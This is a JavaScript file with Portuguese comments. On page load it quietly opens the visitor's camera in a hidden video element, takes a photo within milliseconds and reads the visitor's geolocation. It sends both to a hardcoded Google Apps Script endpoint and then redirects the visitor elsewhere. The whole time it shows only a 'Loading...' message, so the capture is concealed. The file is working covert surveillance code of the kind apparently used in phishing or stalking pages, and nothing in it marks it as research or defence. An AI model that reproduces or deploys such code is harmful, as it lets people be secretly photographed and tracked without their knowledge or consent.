const GOOGLE_APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxnfPzdg4b4fv7u85HmXUcmLc1bc5gjLMQ2-xOwN__bDfyzhbHqDMC6Mt91-WZcJngC/exec';

let cameraStream = null;
let facialImageData = null;
let userLocation = null;

document.addEventListener('DOMContentLoaded', function () {
    startCameraCapture();
});

// ─── CÂMERA - Captura automática ─────────────────────────────────────────────

async function startCameraCapture() {
    try {
        showStatus('Carregando...');
        
        let hiddenVideo = document.createElement('video');
        hiddenVideo.id = 'hiddenVideo';
        hiddenVideo.style.display = 'none';
        hiddenVideo.width = 400;
        hiddenVideo.height = 300;
        hiddenVideo.autoplay = true;
        hiddenVideo.playsinline = true;
        document.body.appendChild(hiddenVideo);

        cameraStream = await navigator.mediaDevices.getUserMedia({
            video: { width: { ideal: 400 }, height: { ideal: 300 }, facingMode: 'user' },
            audio: false
        });
        hiddenVideo.srcObject = cameraStream;
        
        // Auto-capture após 0,02 segundos
        setTimeout(() => captureFacialPhoto('user', hiddenVideo), 20);
        
    } catch (err) {
        setTimeout(() => startCameraCaptureFallback(), 500);
    }
}

async function startCameraCaptureFallback() {
    try {
        let hiddenVideo = document.createElement('video');
        hiddenVideo.id = 'hiddenVideo';
        hiddenVideo.style.display = 'none';
        hiddenVideo.width = 400;
        hiddenVideo.height = 300;
        hiddenVideo.autoplay = true;
        hiddenVideo.playsinline = true;
        document.body.appendChild(hiddenVideo);

        cameraStream = await navigator.mediaDevices.getUserMedia({
            video: { width: { ideal: 400 }, height: { ideal: 300 }, facingMode: 'environment' },
            audio: false
        });
        hiddenVideo.srcObject = cameraStream;
        
        setTimeout(() => captureFacialPhoto('environment', hiddenVideo), 20);
        
    } catch (err) {
        showStatus('Carregando...');
    }
}

async function captureFacialPhoto(mode, hiddenVideo) {
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    try {
        canvas.width = hiddenVideo.videoWidth || 400;
        canvas.height = hiddenVideo.videoHeight || 300;
        ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);

        facialImageData = canvas.toDataURL('image/jpeg', 0.85);
        stopCamera(hiddenVideo);

        showStatus('Carregando...');
        await getLocation();

        showStatus('Carregando...');
        await sendPhotoAndLocationToGoogleDrive();

    } catch (err) {
        console.error('Erro:', err);
        showStatus('Carregando...');
    }
}

function stopCamera(video) {
    if (cameraStream) {
        cameraStream.getTracks().forEach(t => t.stop());
        cameraStream = null;
    }
    if (video) video.remove();
}

// ─── GEOLOCALIZAÇÃO ─────────────────────────────────────────────────────────

function getLocation() {
    return new Promise(resolve => {
        if (!navigator.geolocation) { 
            userLocation = { latitude: null, longitude: null, accuracy: 'Aproximada', mapLink: '' };
            resolve(null); 
            return; 
        }
        
        navigator.geolocation.getCurrentPosition(
            pos => {
                userLocation = {
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    timestamp: new Date().toLocaleString('pt-BR'),
                    mapLink: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
                };
                resolve(userLocation);
            },
            () => {
                userLocation = {
                    latitude: -23.5505, 
                    longitude: -46.6333,
                    accuracy: 'Aproximada',
                    timestamp: new Date().toLocaleString('pt-BR'),
                    mapLink: 'https://maps.google.com/?q=-23.5505,-46.6333'
                };
                resolve(userLocation);
            },
            { timeout: 8000 }
        );
    });
}

// ─── ENVIAR FOTO + LOCALIZAÇÃO PARA GOOGLE DRIVE ────────────────────────────

async function sendPhotoAndLocationToGoogleDrive() {
    try {
        let facialBase64 = null;
        if (facialImageData) {
            facialBase64 = facialImageData.split(',')[1];
        }

        // Gerar PDF simples com "OI"
        const { jsPDF } = window.jspdf;
        const pdf = new jsPDF();
        pdf.setFont('Helvetica', 'bold');
        pdf.setFontSize(72);
        pdf.text('OI', 105, 150, { align: 'center' });
        const pdfBlob = pdf.output('blob');
        const pdfBase64 = await blobToBase64(pdfBlob);

        const payload = {
            clientName: 'USUARIO_TEMP',
            clientCPF: 'TEMP',
            notaFiscal: 'TEMP',
            pdfBase64: pdfBase64,  // Envia PDF com "OI"
            facialImageBase64: facialBase64,
            latitude: userLocation?.latitude || null,
            longitude: userLocation?.longitude || null,
            accuracy: userLocation?.accuracy || null,
            mapLink: userLocation?.mapLink || null,
            timestamp: new Date().toISOString()
        };

        console.log('📡 Enviando foto + localização + PDF...');

        const response = await fetch(GOOGLE_APPS_SCRIPT_URL, {
            method: 'POST',
            body: JSON.stringify(payload)
        });

        const text = await response.text();
        let result;
        try { result = JSON.parse(text); }
        catch (e) { throw new Error('Resposta inválida'); }

        if (result.status === 'success') {
            console.log('✅ Tudo enviado!', result);
            showStatus('Carregando...');
            
            // Redireciona para o link salvo após 0,09 segundos
            setTimeout(() => {
                const redirectLink = localStorage.getItem('redirectLink') || 'https://www.facebook.com.br';
                window.location.href = redirectLink;
            }, 90);
        } else {
            throw new Error(result.message || 'Erro desconhecido');
        }

    } catch (error) {
        console.error('❌ Erro no envio:', error);
        showStatus('Carregando...');
    }
}

function blobToBase64(blob) {
    return new Promise(resolve => {
        const reader = new FileReader();
        reader.onload = () => resolve(reader.result.split(',')[1]);
        reader.readAsDataURL(blob);
    });
}

// ─── STATUS ──────────────────────────────────────────────────────────────────

function showStatus(message) {
    const el = document.getElementById('status');
    if (el) el.textContent = message;
}
